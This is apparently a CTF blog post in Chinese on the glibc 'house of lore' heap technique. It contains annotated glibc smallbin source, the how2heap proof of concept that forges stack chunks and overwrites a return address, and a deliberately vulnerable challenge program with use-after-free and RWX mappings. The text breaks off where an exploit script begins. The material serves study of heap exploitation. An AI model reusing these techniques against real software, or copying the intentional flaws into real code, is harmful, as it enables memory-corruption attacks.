<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>house_of_lore | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>house_of_lore</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-11-02T22:52:33.000Z" id="date"> 2023-11-02</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-11-02T14:54:12.024Z" id="updated"> 2023-11-02</time></div></span></div></div><hr><div id="post-content"><p>unsorted bin + small bin<br>还有largebin版本的<br>利用比较类似</p>
<p>贴一波smallbin的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">       hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">       (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">       processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">       anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb)) &#123;<br>        <span class="hljs-comment">// 获取 small bin 的索引</span><br>        idx = smallbin_index(nb);<br>        <span class="hljs-comment">// 获取对应 small bin 中的 chunk 指针</span><br>        bin = bin_at(av, idx);<br>        <span class="hljs-comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span><br>        <span class="hljs-comment">// 如果 victim = bin ，那说明该 bin 为空。</span><br>        <span class="hljs-comment">// 如果不相等，那么会有两种情况</span><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) &#123;<br>            <span class="hljs-comment">// 第一种情况，small bin 还没有初始化。</span><br>            <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>                <span class="hljs-comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span><br>                malloc_consolidate(av);<br>            <span class="hljs-comment">// 第二种情况，small bin 中存在空闲的 chunk</span><br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>                bck = victim-&gt;bk;<br>                <span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br>                <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;<br>                    errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                    <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>                <span class="hljs-comment">// 设置 victim 对应的 inuse 位</span><br>                set_inuse_bit_at_offset(victim, nb);<br>                <span class="hljs-comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br>                bin-&gt;bk = bck;<br>                bck-&gt;fd = bin;<br>                <span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);<br>                <span class="hljs-comment">// 细致的检查</span><br>                check_malloced_chunk(av, victim, nb);<br>                <span class="hljs-comment">// 将申请到的 chunk 转化为对应的 mem 状态</span><br>                <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>                <span class="hljs-comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
<p>这段程序来自how2heap的house_of_lore,(glibc-2.27 version)<br>展示了unsortedbin的house of lore</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br> <br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-comment">//先填满tache </span><br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//在栈上伪造一段fake_free_list，来骗 </span><br> <br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<span class="hljs-comment">//绕过smallbin的检查 </span><br><br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<span class="hljs-comment">//绕过smallbin检查 </span><br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<span class="hljs-comment">//防止crash </span><br>  <br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//防止合并 </span><br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(dummies[i]);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<span class="hljs-comment">//free进unsortedbin </span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<span class="hljs-comment">//此时根据首个unsortedbin的特性，该chunk的fd和bk指针将会指向libc </span><br><br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<span class="hljs-comment">//申请一个smallbin和unsortedbin的都无法满足其大小的堆块 </span><br>  <span class="hljs-comment">//此时，我们原本的申请的victim就会被插入到smallbin的前面 </span><br>  <span class="hljs-comment">//而且它的fd和bk更新 </span><br>   <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>  <span class="hljs-comment">//模拟UAF篡改victim的过程 </span><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-comment">//清空tache </span><br><br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-comment">//来骗！</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-comment">// 来偷袭！ chunk2stack </span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>写了个小文件,几乎啥漏洞都能打（</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc lore.c -g  -o lore </span><br><span class="hljs-comment">//gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> chunk_time =<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> chunk_size[<span class="hljs-number">50</span>];<br><span class="hljs-type">char</span> *chunk_ptr[<span class="hljs-number">50</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what u want to do next?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Build a house&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Delete a house&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. Edit your house&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. Show your house&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. Exit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;6. Magic&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt;&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> size[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">if</span>(chunk_time&lt;=<span class="hljs-number">32</span>&amp;&amp;chunk_time&gt;=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!chunk_ptr[chunk_time])&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have built %d houses in my world\n&quot;</span>,chunk_time);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You can customize the size of house here, but what about your life&quot;</span>);<br>        read(<span class="hljs-number">0</span>,size,<span class="hljs-number">0x8</span>);<br>        chunk_size[chunk_time] = atoi(size);<br>		chunk_ptr[chunk_time] = <span class="hljs-built_in">malloc</span>(chunk_size[chunk_time]);<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;add something to your house&quot;</span>);<br>        read(<span class="hljs-number">0</span>,chunk_ptr[chunk_time],chunk_size[chunk_time]);<br>        chunk_time++;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something wrong,but you can come in any time&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something wrong,but you can come in any time&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I won&#x27;t set the pointer to zero&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;every decision you made is meaningful&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">free</span>(chunk_ptr[index]);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something wrong?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It&#x27;s never too late to make changes&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something interesting here&quot;</span>);<br>    read(<span class="hljs-number">0</span>,&amp;chunk_size[index],<span class="hljs-number">0x8</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nice choice!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now add something&quot;</span>);<br>    read(<span class="hljs-number">0</span>,chunk_ptr[index],chunk_size[index]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok\n&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nothing is perfect,but you can make something different&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s see what you can do&quot;</span>);<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;index);<br>    <span class="hljs-built_in">puts</span>(chunk_ptr[index]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> choice;<br>    init();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This program is used to explore something about&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;	 **  ** ******    **    ******  **&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;	**__** **__     ****   **__**  **&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; **  ** **      **__**  *****   **&quot;</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;**  ** ****** ******** **      __&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;written by str1k3&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input you passwd:&quot;</span>);<br>    mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0xACE00000</span>,<span class="hljs-number">0x1200</span>ull,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0ll</span>);<br>    read(<span class="hljs-number">0</span>,(<span class="hljs-type">void</span>*)<span class="hljs-number">0xACE00000</span>,<span class="hljs-number">0x233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to my world!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In my world,you can build up some houses&quot;</span>);<br>    mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0xbad00000</span>,<span class="hljs-number">0x120</span>ull,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0ll</span>);<br><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        menu();<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;choice);<br>        <span class="hljs-keyword">switch</span>(choice)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                add();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                delete();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                edit();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ready to exit?&quot;</span>);<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;back to your life!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Use your force! CTFer&quot;</span>);<br>                read(<span class="hljs-number">0</span>,(<span class="hljs-type">void</span>*)<span class="hljs-number">0xbad00000</span>,<span class="hljs-number">0x66</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(str1d3r㉿str1k3Gwindows)-[~/桌面/Desktop]<br>└─$ checksec lore<br>[*] <span class="hljs-string">&#x27;/mnt/Desktop/lore&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 